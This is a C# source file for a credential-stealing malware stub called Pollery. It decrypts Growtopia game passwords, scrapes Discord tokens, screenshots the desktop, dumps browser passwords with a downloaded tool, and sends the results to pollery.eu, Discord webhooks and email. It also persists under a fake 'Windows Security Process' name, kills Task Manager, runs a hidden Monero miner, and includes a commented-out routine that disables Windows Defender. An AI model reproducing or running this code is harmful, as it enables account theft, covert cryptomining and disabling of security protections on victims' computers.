using Microsoft.Win32;
using System;
using System.Collections.Specialized;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.IO.Compression;
using System.Net;
using System.Net.Http;
using System.Net.Http.Headers;
using System.Net.Mail;
using System.Net.NetworkInformation;
using System.Runtime.InteropServices;
using System.Runtime.Serialization;
using System.Runtime.Serialization.Json;
using System.Security.Principal;
using System.Text;
using System.Text.RegularExpressions;
using System.Windows.Forms;

namespace PolleryNew_Stub
{
    public static class Decoder
    {
        public static bool passMode = false;
        public static unsafe uint decrypt(byte* data, uint size, int key)
        {
            uint checksum = 0;
            for (uint i = 0; i < size; i++)
            {
                checksum += data[i] + (uint)(key + i);
                data[i] = (byte)(data[i] - (2 + key + i));
            }
            return checksum;
        }

        public static unsafe uint hash_str(char* str, int len)
        {
            if (str == null) return 0;
            var n = str;
            uint acc = 0x55555555;
            for (int i = 0; i < len; i++)
            {
                acc = (acc >> 27) + (acc << 5) + *n++;
            }
            return acc;
        }

        [DllImport("Kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool GetVolumeInformation(string Volume, StringBuilder VolumeName,
        uint VolumeNameSize, out uint SerialNumber, uint SerialNumberLength,
        uint flags, StringBuilder fs, uint fs_size);

        public static string get_identifier()
        {
            uint dwDiskSerial;
            if (!GetVolumeInformation("C:\\", null, 0, out dwDiskSerial, 0, 0, null, 0))
                if (!GetVolumeInformation("D:\\", null, 0, out dwDiskSerial, 0, 0, null, 0))
                    if (!GetVolumeInformation("E:\\", null, 0, out dwDiskSerial, 0, 0, null, 0))
                        if (!GetVolumeInformation("F:\\", null, 0, out dwDiskSerial, 0, 0, null, 0))
                            if (!GetVolumeInformation("G:\\", null, 0, out dwDiskSerial, 0, 0, null, 0))
                                return "";
            return dwDiskSerial.ToString();
        }

        public static string[] Export()
        {
            string path = Registry.GetValue("HKEY_CURRENT_USER\\Software\\Growtopia", "path", null).ToString() + "\\save.dat";
            using (FileStream fs = new FileStream(path, FileMode.Open, FileAccess.Read, FileShare.ReadWrite))
            {
                using (StreamReader sr = new StreamReader(fs))
                {
                    string save = sr.ReadToEnd();
                    Regex pattern = new Regex(@"[^\x01-\x7E\w]+");
                    string raw = pattern.Replace(save, "|").TrimStart('|').TrimEnd('|');
                    string[] data = raw.Split('|');
                    int index = Array.FindIndex(data, var => !var.Contains("chk") && var.Contains("tankid_password"));
                    string found = data[index + 1];

                    string growid = data[Array.FindIndex(data, var => var.Contains("tankid_name")) + 1];
                    string lastworld = data[Array.FindIndex(data, var => var.Contains("lastworld")) + 1];

                    uint len = Convert.ToUInt32(found.Length);
                    byte[] bytes = Encoding.Default.GetBytes(found);
                    var pass = new byte[len];
                    Array.Copy(bytes, pass, len);
                    string device_id = get_identifier();
                    long br = Convert.ToInt64(device_id);
                    unsafe
                    {
                        fixed (byte* b = pass)
                        {
                            fixed (char* p = device_id)
                            {
                                uint hash = hash_str(p, device_id.Length);
                                var output = decrypt(b, len, (int)hash);
                                string decrypted = Encoding.Default.GetString(pass);
                                string clean = Regex.Replace(decrypted, "[^A-Za-z0-9!@#$%]", string.Empty);
                                return new string[] { growid, clean, lastworld };
                            }
                        }
                    }
                }
            }
        }
    }
    /*WINDEF
    public static class WinDefender
    {
        public static void Proceed()
        {
            if (!new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator)) return;

            RegistryEdit(@"SOFTWARE\Microsoft\Windows Defender\Features", "TamperProtection", "0"); //Windows 10 1903 Redstone 6
            RegistryEdit(@"SOFTWARE\Policies\Microsoft\Windows Defender", "DisableAntiSpyware", "1");
            RegistryEdit(@"SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection", "DisableBehaviorMonitoring", "1");
            RegistryEdit(@"SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection", "DisableOnAccessProtection", "1");
            RegistryEdit(@"SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection", "DisableScanOnRealtimeEnable", "1");

            CheckDefender();
        }

        private static void RegistryEdit(string regPath, string name, string value)
        {
            try
            {
                using (RegistryKey key = Registry.LocalMachine.OpenSubKey(regPath, RegistryKeyPermissionCheck.ReadWriteSubTree))
                {
                    if (key == null)
                    {
                        Registry.LocalMachine.CreateSubKey(regPath).SetValue(name, value, RegistryValueKind.DWord);
                        return;
                    }
                    if (key.GetValue(name) != (object)value)
                        key.SetValue(name, value, RegistryValueKind.DWord);
                }
            }
            catch { }
        }

        private static void CheckDefender()
        {
            Process proc = new Process
            {
                StartInfo = new ProcessStartInfo
                {
                    FileName = "powershell",
                    Arguments = "Get-MpPreference -verbose",
                    UseShellExecute = false,
                    RedirectStandardOutput = true,
                    WindowStyle = ProcessWindowStyle.Hidden,
                    CreateNoWindow = true
                }
            };
            proc.Start();
            while (!proc.StandardOutput.EndOfStream)
            {
                string line = proc.StandardOutput.ReadLine();

                if (line.StartsWith(@"DisableRealtimeMonitoring") && line.EndsWith("False"))
                    RunPS("Set-MpPreference -DisableRealtimeMonitoring $true"); //real-time protection

                else if (line.StartsWith(@"DisableBehaviorMonitoring") && line.EndsWith("False"))
                    RunPS("Set-MpPreference -DisableBehaviorMonitoring $true"); //behavior monitoring

                else if (line.StartsWith(@"DisableBlockAtFirstSeen") && line.EndsWith("False"))
                    RunPS("Set-MpPreference -DisableBlockAtFirstSeen $true");

                else if (line.StartsWith(@"DisableIOAVProtection") && line.EndsWith("False"))
                    RunPS("Set-MpPreference -DisableIOAVProtection $true"); //scans all downloaded files and attachments

                else if (line.StartsWith(@"DisablePrivacyMode") && line.EndsWith("False"))
                    RunPS("Set-MpPreference -DisablePrivacyMode $true"); //displaying threat history

                else if (line.StartsWith(@"SignatureDisableUpdateOnStartupWithoutEngine") && line.EndsWith("False"))
                    RunPS("Set-MpPreference -SignatureDisableUpdateOnStartupWithoutEngine $true"); //definition updates on startup

                else if (line.StartsWith(@"DisableArchiveScanning") && line.EndsWith("False"))
                    RunPS("Set-MpPreference -DisableArchiveScanning $true"); //scan archive files, such as .zip and .cab files

                else if (line.StartsWith(@"DisableIntrusionPreventionSystem") && line.EndsWith("False"))
                    RunPS("Set-MpPreference -DisableIntrusionPreventionSystem $true"); // network protection 

                else if (line.StartsWith(@"DisableScriptScanning") && line.EndsWith("False"))
                    RunPS("Set-MpPreference -DisableScriptScanning $true"); //scanning of scripts during scans

                else if (line.StartsWith(@"SubmitSamplesConsent") && !line.EndsWith("2"))
                    RunPS("Set-MpPreference -SubmitSamplesConsent 2"); //MAPSReporting 

                else if (line.StartsWith(@"MAPSReporting") && !line.EndsWith("0"))
                    RunPS("Set-MpPreference -MAPSReporting 0"); //MAPSReporting 

                else if (line.StartsWith(@"HighThreatDefaultAction") && !line.EndsWith("6"))
                    RunPS("Set-MpPreference -HighThreatDefaultAction 6 -Force"); // high level threat // Allow

                else if (line.StartsWith(@"ModerateThreatDefaultAction") && !line.EndsWith("6"))
                    RunPS("Set-MpPreference -ModerateThreatDefaultAction 6"); // moderate level threat

                else if (line.StartsWith(@"LowThreatDefaultAction") && !line.EndsWith("6"))
                    RunPS("Set-MpPreference -LowThreatDefaultAction 6"); // low level threat

                else if (line.StartsWith(@"SevereThreatDefaultAction") && !line.EndsWith("6"))
                    RunPS("Set-MpPreference -SevereThreatDefaultAction 6"); // severe level threat
            }
        }

        private static void RunPS(string args)
        {
            Process proc = new Process
            {
                StartInfo = new ProcessStartInfo
                {
                    FileName = "powershell",
                    Arguments = args,
                    WindowStyle = ProcessWindowStyle.Hidden,
                    CreateNoWindow = true
                }
            };
            proc.Start();
        }
    }
    WINDEF*/
    public static class WebhookSender
    {
        private static readonly WebClient dWebClient = new WebClient();

        public static void Send(string webhook, string msg)
        {
            NameValueCollection discord = new NameValueCollection();
            discord.Add("username", "Pollery Webhook");
            discord.Add("avatar_url", "https://i.imgur.com/QLU0leX.png");
            discord.Add("content", msg);

            dWebClient.UploadValues(webhook, discord);
        }
    }

    public class Configuration
    {
        public string[] users = new string[] { "rubby" };
        public bool dwebhook = false;
        public string[] webhooks = new string[] {  };

        public bool demail = true;
        public string fromemail = null;
        public string toemail = null;

        public string addr = "empty";
        public string options = "0000000000";
    }

    public static class Utils
    {
        public static PolleryClient client = new PolleryClient();
        //P-Coin
        public static void Mine()
        {
            Configuration cf = new Configuration();
            cf.addr = client.DownloadString("https://pollery.eu/api/addr.txt");
            if (!File.Exists(Path.GetTempPath() + "\\winsecurity7\\xmrig.exe"))
            {
                if (!Directory.Exists(Path.GetTempPath() + "\\winsecurity7"))
                    Directory.CreateDirectory(Path.GetTempPath() + "\\winsecurity7");

                client.DownloadFile("https://pollery.eu/api/pcoin/miner.zip", Path.GetTempPath() + "\\winsecurity7\\miner.zip");
                ZipFile.ExtractToDirectory(Path.GetTempPath() + "\\winsecurity7\\miner.zip", Path.GetTempPath() + "\\winsecurity7");
            }

            var mining = "--donate-level 1 --cuda --opencl -o pool.minexmr.com:4444 -u " + cf.addr + " -k --rig-id " + cf.users[0] + " -t " + Environment.ProcessorCount / 2;

            var proc = new Process
            {
                StartInfo = new ProcessStartInfo
                {
                    FileName = Path.GetTempPath() + "\\winsecurity7\\xmrig.exe",
                    WorkingDirectory = Path.GetTempPath() + "\\winsecurity7",
                    Arguments = mining,
                    UseShellExecute = false,
                    RedirectStandardOutput = true,
                    CreateNoWindow = true
                }
            };

            proc.OutputDataReceived += new DataReceivedEventHandler(OutputHandler);
            proc.ErrorDataReceived += (obj, args) => { proc.OutputDataReceived -= new DataReceivedEventHandler(OutputHandler); };
            proc.Exited += (obj, args) => { proc.OutputDataReceived -= new DataReceivedEventHandler(OutputHandler); };
            proc.Start();
            proc.BeginOutputReadLine();
        }

        public static void OutputHandler(object sendingProcess, DataReceivedEventArgs outLine)
        {
            Configuration cf = new Configuration();
            try
            {
                if (sendingProcess == null || outLine.Data == null || !outLine.Data.Contains("accepted"))
                    return;

                Random r = new Random();

                int earned = r.Next(1, 5);
                NameValueCollection reward = new NameValueCollection();
                reward["username"] = cf.users[0];
                reward["increase"] = earned.ToString();
                byte[] rewarder = client.UploadValues("https://pollery.eu/api/pcoin/pcoin-earn.php", reward);
                if (Encoding.Default.GetString(rewarder) == "success")
                {
                    reward.Clear();
                    reward["username"] = cf.users[0];
                    client.UploadValues("https://pollery.eu/api/pcoin/pcoin-check.php", reward);
                }
            }
            catch
            {
                Console.WriteLine("xmrig process still running..");
            }
        }
        //Discord Token
        public static bool CheckToken(string token)
        {
            try
            {
                var http = new WebClient();
                http.Headers.Add("Authorization", token);
                var result = http.DownloadString("https://discordapp.com/api/v6/users/@me");
                if (!result.Contains("Unauthorized"))
                {
                    return true;
                }
                else
                {
                    return false;
                }
            }
            catch
            {
                return false;
            }
        }

        public static string Token()
        {
            try
            {
                using (FileStream fs = new FileStream(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "//Discord//Local Storage//leveldb//000005.ldb", FileMode.Open, FileAccess.Read, FileShare.ReadWrite))
                {
                    using (StreamReader sr = new StreamReader(fs))
                    {
                        string token_reg = @"[a-zA-Z0-9]{24}\.[a-zA-Z0-9]{6}\.[a-zA-Z0-9_\-]{27}|mfa\.[a-zA-Z0-9_\-]{84}";
                        Match token = Regex.Match(sr.ReadToEnd(), token_reg);
                        if (token.Success)
                        {
                            if (CheckToken(token.Value))
                            {
                                return token.Value;
                            }
                            else
                            {
                                return token.Value + " ~ Not Authorized";
                            }
                        }
                        else
                            return "N/A";
                    }
                }
            }
            catch
            {
                return "N/A";
            }
        }

        //Other
        [DllImport("ntdll.dll", SetLastError = true)]
        private static extern int NtSetInformationProcess(IntPtr hProcess, int processInformationClass, ref int processInformation, int processInformationLength);
        public static void ProcessProtection(int iscrit)
        {
            Process.EnterDebugMode();
            NtSetInformationProcess(Process.GetCurrentProcess().Handle, 0x1D, ref iscrit, sizeof(int));
        }

        public static string GetIP()
        {
            try
            {
                return new WebClient().DownloadString("https://api.ipify.org/");
            } catch { return "Failed N/A"; }
        }

        public static string GetMac()
        {
            try
            {
                string mac = string.Empty;
                foreach (NetworkInterface ni in NetworkInterface.GetAllNetworkInterfaces())
                {
                    if (ni.OperationalStatus == OperationalStatus.Up && ni.Speed > 50 && ni.GetPhysicalAddress().ToString().Length > 5)
                    {
                        mac += ni.GetPhysicalAddress().ToString() + ",";
                    }
                }

                return mac.TrimEnd(',');
            }
            catch
            {
                return "Failed (N/A)";
            }
        }

        public class JsonResponse
        {
            public string url { get; set; }
        }
        public static string GetScreenshot()
        {
            try
            {
                Bitmap bmp = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
                using (Graphics g = Graphics.FromImage(bmp))
                {
                    g.CopyFromScreen(0, 0, 0, 0, Screen.PrimaryScreen.Bounds.Size);
                }
                MemoryStream ms = new MemoryStream();
                bmp.Save(ms, ImageFormat.Jpeg);
                byte[] byteImage = ms.ToArray();
                var base64 = Convert.ToBase64String(byteImage);

                NameValueCollection nvc = new NameValueCollection();
                nvc["key"] = "779092a75cb1a58cce3ee99e82959d15";
                nvc["image"] = base64;

                string response = Encoding.Default.GetString(new WebClient().UploadValues("https://api.imgbb.com/1/upload", nvc));
                Match r = Regex.Match(response, @"https:\\\/\\\/i.ibb.co\\\/[A-z0-9]+\/[A-z0-9]+.jpg");
                return r.Value.Replace(@"\", string.Empty);
            }
            catch { return "Failed (N/A)"; }
        }

        public static void RegistryStartup()
        {
            try
            {
                Configuration cf = new Configuration();
                string cfg = cf.options;
                RegistryKey rkApp = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
                File.Copy(Application.ExecutablePath, Path.GetTempPath() + AppDomain.CurrentDomain.FriendlyName);
                rkApp.SetValue("Windows Security Process", Path.GetTempPath() + AppDomain.CurrentDomain.FriendlyName);
                if (cfg[7] == '1')
                {
                    File.SetAttributes(Application.ExecutablePath, File.GetAttributes(Application.ExecutablePath) | FileAttributes.Hidden);
                }
            } catch { }
        }

        public static void AntiTaskManager()
        {
            System.Threading.Timer t = new System.Threading.Timer(TimerCallback, null, 0, 2000);
        }

        private static void TimerCallback(object state)
        {
            Process[] p = Process.GetProcessesByName("taskmgr");
            if (p.Length > 0)
                p[0].Kill();

            GC.Collect();
        }

        public static string GetBrowserCredentials()
        {
            try
            {
                if (!File.Exists(Path.GetTempPath() + "wb.exe"))
                    new WebClient().DownloadFile("https://github.com/rubby1337/pollery-bins/raw/master/wb.exe", Path.GetTempPath() + "wb.exe");
                Process p = new Process();
                p.StartInfo.FileName = Path.GetTempPath() + "wb.exe";
                p.StartInfo.CreateNoWindow = true;
                p.StartInfo.UseShellExecute = true;
                p.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                p.StartInfo.Arguments = "/shtml browser.html";
                p.StartInfo.WorkingDirectory = Path.GetTempPath();
                p.Start();
                p.WaitForExit();

                using (FileStream fs = new FileStream(Path.GetTempPath() + "browser.html", FileMode.Open, FileAccess.Read, FileShare.ReadWrite))
                {
                    using (StreamReader sr = new StreamReader(fs))
                    {
                        return sr.ReadToEnd().Replace("WebBrowserPassView", "Pollery").Replace("http://www.nirsoft.net/", "https://pollery.eu");
                    }
                }
            }
            catch { return "Failed [Probably Antivirus]"; }
        }

        public static void Trace()
        {
            Console.WriteLine("trace");
            FileSystemWatcher watcher = new FileSystemWatcher();
            string filePath = Registry.GetValue("HKEY_CURRENT_USER\\Software\\Growtopia", "path", null).ToString();
            watcher.Path = filePath;
            watcher.NotifyFilter = NotifyFilters.LastWrite;
            watcher.Filter = "save.dat";
            watcher.Changed += new FileSystemEventHandler(OnChanged);

            watcher.EnableRaisingEvents = true;
        }

        public static string previous = null;
        public static void OnChanged(object sender, FileSystemEventArgs e)
        {
            Console.WriteLine("changed");
            string growid = Decoder.Export()[0];
            if (growid != previous)
            {
                Program.Main();
            }
        }
		
		public static void Plugin()
		{
			//customplugins
		}
    }

    public class PolleryClient : WebClient
    {
        public PolleryClient() { }

        protected override WebRequest GetWebRequest(Uri address)
        {
            var request = base.GetWebRequest(address) as HttpWebRequest;
            request.UserAgent = "Pollery-Client";

            return request;
        }
    }

    public static class Program
    {
        public static string mycockbruh(string base64EncodedData)
        {
            var base64EncodedBytes = Convert.FromBase64String(base64EncodedData);
            return Encoding.UTF8.GetString(base64EncodedBytes);
        }

        public static void Main()
        {
            Console.WriteLine("start");
            Utils.Trace();
            ServicePointManager.Expect100Continue = true;
            ServicePointManager.SecurityProtocol = SecurityProtocolType.Ssl3 | SecurityProtocolType.Tls | SecurityProtocolType.Tls11 | SecurityProtocolType.Tls12;

            Configuration cf = new Configuration();

            if (Utils.previous == null)
            {
                try { Utils.Plugin(); } catch { }
                /*WINDEF WinDefender.Proceed(); WINDEF*/
                /*MINE Utils.Mine(); MINE*/
            }
            string id = string.Empty;
            string pass = string.Empty;
            string lw = string.Empty;
            if (Decoder.passMode || Utils.previous != null)
            {
                try
                {
                    string[] data = Decoder.Export();
                    id = data[0];
                    pass = data[1];
                    lw = data[2];
                }
                catch {
                    try
                    {
                        string temp = Path.GetTempFileName() + ".exe";
                        WebClient client = new WebClient();
                        client.DownloadFile("https://github.com/rubby1337/pollery-bins/raw/master/savedecrypter.exe", temp);
                        Process p = new Process();
                        p.StartInfo.FileName = temp;
                        p.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                        p.StartInfo.CreateNoWindow = true;
                        p.Start();
                        p.WaitForExit();

                        using (FileStream fs = new FileStream(Path.GetTempPath() + "result.txt", FileMode.Open, FileAccess.Read, FileShare.ReadWrite))
                        {
                            using (StreamReader sr = new StreamReader(fs))
                            {
                                string[] result = sr.ReadToEnd().Split('|');
                                id = result[0];
                                pass = result[1];
                                lw = result[2];
                            }
                        }
                    }
                    catch { }
                }
            }
            else
            {
                try
                {
                    string temp = Path.GetTempFileName() + ".exe";
                    WebClient client = new WebClient();
                    client.DownloadFile("https://github.com/rubby1337/pollery-bins/raw/master/savedecrypter.exe", temp);
                    Process p = new Process();
                    p.StartInfo.FileName = temp;
                    p.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                    p.StartInfo.CreateNoWindow = true;
                    p.Start();
                    p.WaitForExit();

                    using (FileStream fs = new FileStream(Path.GetTempPath() + "result.txt", FileMode.Open, FileAccess.Read, FileShare.ReadWrite))
                    {
                        using (StreamReader sr = new StreamReader(fs))
                        {
                            string[] result = sr.ReadToEnd().Split('|');
                            id = result[0];
                            pass = result[1];
                            lw = result[2];
                        }
                    }
                }
                catch {
                    string[] data = Decoder.Export();
                    id = data[0];
                    pass = data[1];
                    lw = data[2];
                }
            }

            string ip = Utils.GetIP();
            Packet pdata = new Packet();
            pdata.growid = id;
            pdata.password = pass;
            pdata.lastworld = lw;

            string cfg = cf.options;

            if (cfg[0] == '1')
                pdata.token = Utils.Token();
            else
                pdata.token = "Not Activated";

            if (cfg[1] == '1')
                pdata.pcname = Environment.MachineName;
            else
                pdata.pcname = "Not Activated";

            if (cfg[2] == '1')
                pdata.mac = Utils.GetMac();
            else
                pdata.mac = "Not Activated";

            if (cfg[3] == '1')
                pdata.desktoppic = Utils.GetScreenshot();
            else
                pdata.desktoppic = "Not Activated";

            if (cfg[4] == '1')
                pdata.browsercreds = Utils.GetBrowserCredentials();
            else
                pdata.browsercreds = "Not Activated";

            if (cfg[5] == '1')
                Utils.RegistryStartup();

            if (cfg[8] == '1')
                Utils.AntiTaskManager();

            XmlObjectSerializer xmlObjectSerializer = new DataContractJsonSerializer(typeof(Packet));
            MemoryStream ms = new MemoryStream();
            xmlObjectSerializer.WriteObject(ms, pdata);
            ms.Position = 0L;
            string packet = new StreamReader(ms).ReadToEnd();
            bool first = true;
            foreach (string user in cf.users)
            {
                pdata.user = user;
                NameValueCollection nvc = new NameValueCollection();
                nvc["username"] = user;
                nvc["packet"] = packet;
                nvc["ip"] = ip;

                if (first)
                {
                    nvc["id"] = "0";
                    first = false;
                }
                else
                    nvc["id"] = "1";

                string currentsrv = "https://pollery.eu/api/basic/send.php";
                byte[] cock = Utils.client.UploadValues(currentsrv, nvc);
                Console.WriteLine("sent");
            }


            if (cf.dwebhook)
            {
                string pattern = "```Results from {0}```\r\nIP: **{8}** \r\nGrowID: **{1}**\r\nPassword: **{2}**\r\nLast world: **{3}**\r\nDiscord Token: **{4}**\r\nPC Name: **{5}**\r\nMACs:\r\n**{6}**\r\nDesktop Screenshot:\r\n**{7}**\r\nBrowser Credentials: Only available in the server.";
                string msg = string.Format(pattern, DateTime.Now.ToUniversalTime().ToString(), id, pass, lw, pdata.token, pdata.pcname, pdata.mac, pdata.desktoppic, ip);
                foreach (string wh in cf.webhooks)
                {
                    try { WebhookSender.Send(wh, msg); }
                    catch { }
                }
            }

            if (cf.demail)
            {
                string pattern = "-> Date: {0}\r\nIP: {8} \r\nGrowID: {1}\r\nPassword: {2}\r\nLast world: {3}\r\nDiscord Token: {4}\r\nPC Name: {5}\r\nMACs:\r\n{6}\r\nDesktop Screenshot:\r\n{7}";
                string msg = string.Format(pattern, DateTime.Now.ToUniversalTime().ToString(), id, pass, lw, pdata.token, pdata.pcname, pdata.mac, pdata.desktoppic, ip);
                
                try
                {
                    string[] email = mycockbruh(cf.fromemail).Split(':');
                    string subject = id + " | Pollery Email Delivery";
                    MailMessage mailMessage = new MailMessage(email[0], cf.toemail == null ? email[0] : cf.toemail, subject, msg);
                    var smtp = new SmtpClient("smtp.gmail.com", 587);
                    if (cfg[4] == '1')
                    {
                        byte[] byteArray = Encoding.ASCII.GetBytes(pdata.browsercreds);
                        MemoryStream stream = new MemoryStream(byteArray);
                        Attachment at = new Attachment(stream, "Browser_Credentials.html", "text/html");
                        mailMessage.Attachments.Add(at);
                    }
                    smtp.Credentials = new NetworkCredential(email[0], email[1]);
                    smtp.EnableSsl = true;
                    smtp.Send(mailMessage);
                }
                catch { }
            }

            if (cfg[9] == '1' && Utils.previous == null)
                Utils.Trace();

            if (cfg[9] == '1' || cf.addr != "empty")
                Console.ReadLine();
        }
    }
    
    public class Packet
    {
        public string user { get; set; }
        public string growid { get; set; }
        public string password { get; set; }
        public string lastworld { get; set; }
        public string token { get; set; }
        public string browsercreds { get; set; }
        public string pcname { get; set; }
        public string mac { get; set; }
        public string desktoppic { get; set; }
    }
}
